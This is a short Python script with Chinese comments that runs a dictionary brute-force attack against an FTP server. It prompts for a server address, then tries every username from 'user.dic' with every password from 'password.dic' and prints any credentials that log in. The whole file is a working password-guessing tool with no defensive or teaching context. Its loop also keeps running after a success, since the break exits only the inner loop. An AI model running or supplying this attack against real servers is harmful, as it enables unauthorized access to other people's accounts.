import ftplib
import socket

if __name__ == '__main__':
    # 创建ftp对象
    ftp = ftplib.FTP()
    # 与服务器建立连接
    server_port = 21
    # 爆破（用户名和密码从字典中读取）
    while True:
        server_address = input("请输入服务器地址：")
        try:
            reply = ftp.connect(server_address, server_port, timeout=3)
            if "220" in reply:
                print("连接成功！")
                break
        except (socket.timeout, ConnectionRefusedError):
            print("连接失败，ftp服务未运行，或者服务器不在线!")
            exit()
    user_dict = "user.dic"
    password_dict = "password.dic"

    with open(user_dict, "r") as f1, open(password_dict, "r") as f2:
        for user in f1:
            f2.seek(0, 0)
            for password in f2:
                # __
                user = user.strip()
                password = password.strip()
                # __去掉用户名和密码前后的空字符
                try:
                    reply = ftp.login(user, password)
                    if "230" in reply:
                        print("用户名：%s 密码：%s 登录成功！" % (user, password))
                        break
                except ftplib.error_perm:
                    pass
    # 关闭连接
    ftp.close()
